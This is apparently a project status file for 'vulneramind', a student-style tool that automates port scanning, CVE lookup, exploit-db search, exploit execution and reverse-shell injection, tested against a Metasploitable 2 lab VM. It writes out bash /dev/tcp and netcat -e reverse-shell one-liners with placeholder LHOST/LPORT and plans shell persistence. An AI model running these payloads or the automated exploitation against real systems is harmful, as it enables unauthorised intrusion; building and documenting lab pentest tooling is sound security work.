### Project Status

### CURRENT ARCHITECTURE


vulneramind/
├── backend/
│   ├── core/
│   │   ├── __init__.py                      # main execution pipeline
│   │   ├── scanner/
│   │   │   ├── fast_scanner.py             # high-speed port scanning (nmap integration)
│   │   │   ├── service_scanner.py          # service detection & version fingerprinting
│   │   │   └── cve_mapper_cpe.py           # CVE mapping using NVD API (government database)
│   │   └── exploit/
│   │       ├── exploitation.py             # In-memory exploit database searching (must have exploitdb in json format)
│   │       ├── smart_exploit_runner.py     # RCE classification & intelligent execution
│   │       └── payload_manager.py          # Interactive Payload Wizard & shell automation ( changes needed the payloads are too complex and not working properly will need to write simplified FIFO pipes payloads in the future)
│   ├── ai/
│   │   ├── analysis/                       # AI-powered vulnerability analysis (not writtent yet)
│   │   └── reporting/
│   │       └── report_generation.py        # Automated report generation (not done)
│   └── database/                           # Data persistence and caching (not done)
├── exploitdb.json                          # Local exploit database cache (50,000+ exploits) (this must be added here before execution)
├── requirements.txt                        # Python dependencies with system requirements
├── README.md                               # Project documentation
└── INSTRUCTIONS_AND_CURRENT_PROGRESS.md   # This comprehensive status report


### What's Working Right Now (Phase 1 & 2)

#### 1. Port Scanning & Service Detection
**Status: Works pretty well**
- Fast nmap scanning (uses -T5 so it's aggressive but quick)
- Finds services and their versions (like vsftpd 2.3.4, OpenSSH 4.7p1, etc.)
- Scans 1000 ports in about 10-15 seconds which is decent
- Works on Linux/Windows targets, tested mainly on Metasploitable 2

#### 2. CVE Lookup System 
**Status: Working but slow due to API limits**
- Connects to the official NVD database (government CVE database)
- Automatically builds CPE strings from service info
- Found 183 CVEs when I tested it on Metasploitable 2
- Takes ~2 seconds per service because of API rate limits
- Uses multiple search strategies if the first one fails

#### 3. Exploit Database Search
**Status: This part is actually very fast now**
- Searches through 50,000+ exploits from exploit-db
- Used to be super slow with subprocess calls, now it's in-memory so 50-100x faster
- Searches by product name, version, or CVE numbers
- Finds relevant exploits in under 1 second now (big improvement)
- Works offline once you have the exploitdb.json file

#### 4. RCE Detection & Smart Filtering
**Status: Pretty good at finding the good stuff**
- Automatically finds Remote Code Execution exploits from the noise
- Scores exploits 20-100 based on how likely they are to work
- Skips the garbage (DoS, XSS, proof-of-concepts that don't work)
- Found 50+ actual RCE exploits out of 150+ total for Metasploitable 2

**What RCE patterns we look for:**
```python
# Stuff that usually means "you can run commands on this box"
'remote code execution', 'command execution', 'buffer overflow',
'backdoor', 'reverse shell', 'arbitrary code', 'memory corruption'

# How we score them:
CRITICAL_RCE (100 points) - Easy scripts (.py, .sh, .pl) that we can modify easily
RCE (90 points)          - C programs that need compilation but still RCE
INFO_DISCLOSURE (60)     - Info leaks (useful but not shells)
LOW_VALUE (20)          - DoS and other junk we usually skip
```

#### 5. Interactive Payload Wizard
**Status:  Works but the shells are kind of complex**
- Asks you for LHOST/LPORT and injects reverse shells into exploits
- Supports Python, C, Perl, Ruby, Bash exploits
- Starts netcat listeners automatically
- **Problem**: The payloads are too complex and don't always work properly
- **TODO**: Need to write simpler FIFO pipe shells that actually work

**Payload types we have:**
1. **Bash**: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
2. **Python**: Socket programming stuff (complex)
3. **Netcat**: `nc LHOST LPORT -e /bin/sh`
4. **Perl**: Socket-based (also complex)

#### 6. Exploit Execution Engine
**Status:  Runs exploits pretty good**
- Skips the broken stuff automatically (PoCs, DoS, client-side attacks)
- Runs .py, .c, .pl, .sh, .rb files
- Compiles C exploits with gcc automatically
- Tries different parameter combinations if the first one fails
- Shows you the actual exploit output (finally!)
- Tracks which ones actually worked

---

#### File types we can run:
```
.py files   → python3 (just runs them directly)
.c files    → gcc compilation then run the binary
.pl files   → perl interpreter
.rb files   → ruby (for Metasploit modules)
.sh files   → bash/sh scripts

# How we try to run them:
[target, port]       # Like: 192.168.1.100 22
[target]             # Just: 192.168.1.100  
[target:port]        # Combined: 192.168.1.100:22
```

---

###  **What Actually Works (Test Results)**

#### Tested on Metasploitable 2 (192.168.56.102):
```
WHAT WAS FOUND:
- 12 open ports/services
- 183 CVEs mapped from NVD
- 153 relevant exploits from exploit-db
- 50+ RCE exploits identified and prioritized

WHAT ACTUALLY WORKED:
- 5-8 exploits work per test run (out of 25+ attempted)
- Success rate: 20-30% (which is actually decent for public exploits)
- Got 2-3 reverse shells in most test sessions
- The vsftpd 2.3.4 backdoor works reliably

ALSO:
- Most exploit-db entries are proof-of-concepts that need tweaking
- Success rate varies a lot based on target and versions
- Some exploits need libraries we don't have (rpc/rpc.h, etc.)
- Network setup matters (NAT can break reverse shells)
```

#### Actual output example:
```bash
 Found 50 RCE exploits with shell potential!
[*] LHOST: 192.168.56.1, LPORT: 4444
 7 exploits executed successfully
 3 RCE exploits confirmed working  
 2 reverse shell connections established
```

---

###  **What's Broken/Needs Work**
- **Main problems**: Version mismatches, missing libraries, proof-of-concept code

#### Current issues:
- **Payload injection is complex**: Complex C code breaks when we inject shells
- **Ruby dependencies**: Some Metasploit modules need gems we don't have
- **Compilation errors**: Old exploits fail due to missing headers
- **Shell stability**: Reverse shells work but are unstable

#### Payload Manager needs work:
```python
# Known problems (documented in payload_manager.py):
# 1. Shells are too complex and break easily
# 2. C code injection messes up compilation sometimes  
# 3. Need simpler FIFO pipe shells instead
# 4. Listener management is janky
```

---

###  **What's Next (TODO List)**

#### Phase 3: Maybe Add Some AI Stuff
- **ML exploit prediction**: Use AI to guess which exploits will work
- **Target profiling**: Better OS/service fingerprinting
- **Smart recommendations**: AI suggests which exploits to try first

#### Phase 4: Fix the Shell Problems
- **Metasploit integration**: Use MSF for better payloads
- **Simpler shells**: Write basic FIFO pipe reverse shells that actually work
- **Multi-session handling**: Manage multiple shells at once
- **Persistence**: Keep shells alive across reboots

#### Phase 5: Make It Look Less Like a Terminal App
- **Web interface**: Maybe React or Vue.js dashboard
- **Better reports**: Generate actual pentest reports
- **Team features**: Multiple people working on same target

---

###  **How to Set This Up**

#### You need:
```bash
- Linux (or WSL2 on Windows)
- Python 3.8+ (I use 3.12)
- Direct network access to targets
```

#### Installation (the easy way):
```bash
# 1. Get the code
git clone https://github.com/M-Umair-J/vulneramind.git
cd vulneramind

# 2. Python stuff
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

# 3. System tools (Ubuntu/Debian)
sudo apt-get install nmap netcat-traditional exploitdb gcc build-essential perl ruby
sudo searchsploit -u

# 4. Get an NVD API key (optional but recommended)
# Go to https://nvd.nist.gov/developers/request-an-api-key
export NVD_API_KEY="your-key-here"

# 5. Test it
sudo python3 backend/core/__init__.py 127.0.0.1
```

---

### **How to Actually Use This Thing**

#### Basic scan:
```bash
# Simple scan
sudo python3 backend/core/__init__.py 192.168.1.100 

# Full port range (takes longer)
sudo python3 backend/core/__init__.py 192.168.1.100 1-65535
```

#### With reverse shells:
```bash
sudo python3 backend/core/__init__.py 192.168.56.102

# It will ask:
Would you like to configure reverse shell payloads? (y/n): y
Enter your attack machine IP (LHOST): 192.168.56.1
Enter listener port (LPORT) [4444]: 4444
Select payload type [1-4]: 1
```

#### What you'll see:
```bash
 Found 50 RCE exploits with shell potential!
 Enhancing RCE exploit with reverse shell payload...

============================================================
EXPLOITATION SUMMARY
============================================================
 7 SUCCESSFUL EXPLOITS:
    3 RCE EXPLOITS WITH PAYLOAD (SHELL ACCESS):
     Port 21 (vsftpd 2.3.4): vsftpd 2.3.4 Backdoor Command Execution
     Port 22 (OpenSSH 4.7p1): SSH User Code Execution
   
Active Listeners:
    Port 4444: Listening for reverse shells
```

---

### **Testing Setup**

#### My test lab:
```bash
Target: Metasploitable 2 VM (192.168.56.102)
Attack box: Windows 11 + WSL2 Ubuntu
Network: VirtualBox host-only adapter
```

#### What works and what not:
```
Port scanning: Finds all 12 services correctly
Service detection: Gets versions right 100% of the time
CVE mapping: 183 CVEs found for Metasploitable 2
Exploit finding: 153 relevant exploits discovered
RCE detection: 50 high-value targets identified
Shell injection: Payloads get inserted properly
Listeners: Netcat starts up correctly but we need new process with new for this one so that it can be separate from all the gibberish and can easily connect with the reverse shell on target machine.
Multi-language: Python, C, Perl, Ruby, Bash all don't work especially problems with C and perl payloads
```

---

#### Current status:
```
Phase 1 (Scanning): 100% done
Phase 2 (RCE automation): 100% done
Phase 3 (Better payloads): Planning
Phase 4 (AI stuff): Needed
Phase 5 (Web UI)
```

---

**Next priorities:**
1. Add some ML for better exploit prediction
2. Fix the payload injection system
3. Test on more targets besides Metasploitable 2
4. Build a simple web interface

---

ONE LAST THING:
RIGHT NOW THE PAYLOADS WORK AND DO ACTUALLY EXECUTE THE REVERSE SHELL (SOME NEED FIXING ESPECIALLY C AND PERL ONES) BUT FOR SOME REASON THOSE SHELLS DON'T CONNECT TO THE CURRENT SHELL PROCESS THAT WE EXECUTE CODE ON SO WE MAY NEED TO CREATE A NEW THREAD OR A SEPERATE PROCESS WHERE THE SHELL FOR THE COMMAND AND CONTROL WILL BE CREATED AND CONNECTED BACK TO THE REVERSE SHELL ON TARGET BY USING A NETCAT LISTENER ON THIS NEW PROCESS OR THREAD.
FOR NOW FOCUS ON EXPLOIT PRIORITIZATION USING AI MODELS AND WORK ON THE FRONT END WHICH WE CAN QUICKLY INTEGRATE FOR THE PRESENTATION ON MONDAY!!!

KEEP UPDATING THIS AFTER EACH COMMIT

*Last updated: 17 July 2025*  
*Tested on: Metasploitable 2, some other VMs*  
*Platform: Windows 11 + WSL2